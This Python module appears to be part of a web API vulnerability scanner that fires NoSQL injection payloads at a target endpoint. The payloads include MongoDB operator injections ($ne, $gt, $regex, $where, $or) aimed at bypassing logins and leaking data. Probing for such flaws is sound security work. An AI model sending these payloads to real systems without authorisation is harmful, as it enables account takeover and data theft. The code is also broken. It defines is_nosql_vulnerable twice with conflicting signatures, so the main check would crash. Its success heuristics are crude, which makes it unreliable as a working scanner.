#!/usr/bin/env python3
import requests
from typing import Dict, List, Optional
from urllib.parse import urljoin, parse_qs, urlparse
import json
import re
from RAGScripts.utils.logger import setup_scanner_logger

async def check_nosql_injection(target_url: str, path: str, method: str, initial_response: requests.Response) -> List[Dict]:
    findings = []
    
    try:
        test_url = urljoin(target_url, path)
        
        # Test cases for NoSQL injection
        test_cases = [
            {
                'name': 'MongoDB Injection',
                'payloads': [
                    '{"$gt": ""}',
                    '{"$ne": null}',
                    '{"$regex": ".*"}',
                    '{"$where": "1==1"}',
                    '{"$exists": true}'
                ]
            },
            {
                'name': 'Array Injection',
                'payloads': [
                    '{"$in": ["admin"]}',
                    '{"$nin": [null]}',
                    '{"$all": ["admin"]}',
                    '{"$elemMatch": {"$eq": "admin"}}',
                    '{"$size": 1}'
                ]
            },
            {
                'name': 'Operator Injection',
                'payloads': [
                    '{"$or": [{"username": "admin"}, {"username": "admin"}]}',
                    '{"$and": [{"password": {"$ne": null}}, {"username": "admin"}]}',
                    '{"$not": {"username": "invalid"}}',
                    '{"$nor": [{"username": "invalid"}, {"password": null}]}',
                    '{"username": {"$type": "string"}}'
                ]
            },
            {
                'name': 'JavaScript Injection',
                'payloads': [
                    '{"$where": "this.password.length > 0"}',
                    '{"$where": "function() { return true; }"}',
                    '{"$expr": {"$gt": ["$password", ""]}}',
                    '{"$where": "this.username == this.password"}',
                    '{"$where": "new Date() > new Date(0)"}'
                ]
            }
        ]
        
        # Extract parameters from initial response
        params = extract_parameters(initial_response)
        
        for param_name, param_value in params.items():
            for test in test_cases:
                for payload in test['payloads']:
                    try:
                        # Test JSON parameters
                        headers = {'Content-Type': 'application/json'}
                        data = {param_name: json.loads(payload)}
                        
                        response = requests.request(
                            method,
                            test_url,
                            json=data,
                            headers=headers,
                            timeout=5
                        )
                        
                        if is_nosql_vulnerable(response, test, payload):
                            findings.append({
                                "type": "NoSQL Injection",
                                "detail": f"Potential {test['name']} vulnerability",
                                "evidence": {
                                    "url": test_url,
                                    "parameter": param_name,
                                    "payload": payload,
                                    "status_code": response.status_code,
                                    "response": response.text[:200]
                                }
                            })
                            
                    except requests.exceptions.RequestException:
                        continue
                    
    except Exception as e:
        print(f"Error in NoSQL injection check: {str(e)}")
    
    return findings

def extract_parameters(response: requests.Response) -> Dict:
    params = {}
    
    # Extract URL parameters
    if response.request.url:
        parsed_url = urlparse(response.request.url)
        params.update(parse_qs(parsed_url.query))
    
    # Extract JSON parameters
    try:
        if 'application/json' in response.headers.get('Content-Type', ''):
            json_data = response.json()
            params.update(flatten_json(json_data))
    except:
        pass
    
    return params

def flatten_json(json_obj: Dict, parent_key: str = '') -> Dict:
    items = {}
    for key, value in json_obj.items():
        new_key = f"{parent_key}.{key}" if parent_key else key
        if isinstance(value, dict):
            items.update(flatten_json(value, new_key))
        else:
            items[new_key] = str(value)
    return items

def is_nosql_vulnerable(response: requests.Response, test: Dict, payload: str) -> bool:
    try:
        response_text = response.text.lower()
        
        # NoSQL error messages
        error_patterns = [
            'mongodb',
            'mongoose',
            'bson',
            'objectid',
            'malformed query',
            'invalid operator',
            'cannot use $',
            'not authorized',
            'authentication failed',
            'syntax error'
        ]
        
        # Check for NoSQL errors
        if any(pattern in response_text for pattern in error_patterns):
            if response.status_code != 500:  # Expect 500 for proper error handling
                return True
        
        # Check for successful authentication bypass
        if test['name'] == 'MongoDB Injection':
            if response.status_code == 200:
                success_indicators = ['welcome', 'dashboard', 'profile', 'admin']
                if any(indicator in response_text for indicator in success_indicators):
                    return True
        
        # Check for data leakage
        if test['name'] == 'Operator Injection':
            sensitive_data = ['password', 'email', 'token', 'key', 'secret']
            if any(data in response_text for data in sensitive_data):
                return True
        
        # Check for JavaScript execution
        if test['name'] == 'JavaScript Injection':
            if 'function' in payload and response.status_code == 200:
                return True
        
    except:
        pass
    
    return False

def scan(url: str, method: str, token: str = None) -> List[Dict]:
    results = []
    payloads = [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$where": "1==1"}',
        '{"$regex": ".*"}',
        {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
    ]
    
    headers = {
        "Authorization": f"Bearer {token}" if token else "",
        "Content-Type": "application/json"
    }
    
    try:
        for payload in payloads:
            # Test in request body
            response = requests.post(url, json=payload, headers=headers)
            
            if is_nosql_vulnerable(response):
                results.append({
                    "type": "NOSQL_INJECTION",
                    "severity": "HIGH",
                    "detail": f"Potential NoSQL injection with payload: {payload}",
                    "evidence": {
                        "url": url,
                        "method": method,
                        "payload": str(payload),
                        "status_code": response.status_code,
                        "response": response.text[:500]
                    }
                })
    except Exception as e:
        print(f"Error in NoSQL injection check: {e}")
    
    return results

def is_nosql_vulnerable(response) -> bool:
    # Check for signs of successful NoSQL injection
    return (response.status_code == 200 and 
            ('"users"' in response.text or 
             '"data"' in response.text or 
             '"result"' in response.text))

if __name__ == "__main__":
    # For standalone testing
    import asyncio
    async def test():
        result = await check_nosql_injection(
            "http://localhost:5000",
            "/api/users",
            "POST",
            requests.Response()
        )
        print(json.dumps(result, indent=2))
    
    asyncio.run(test())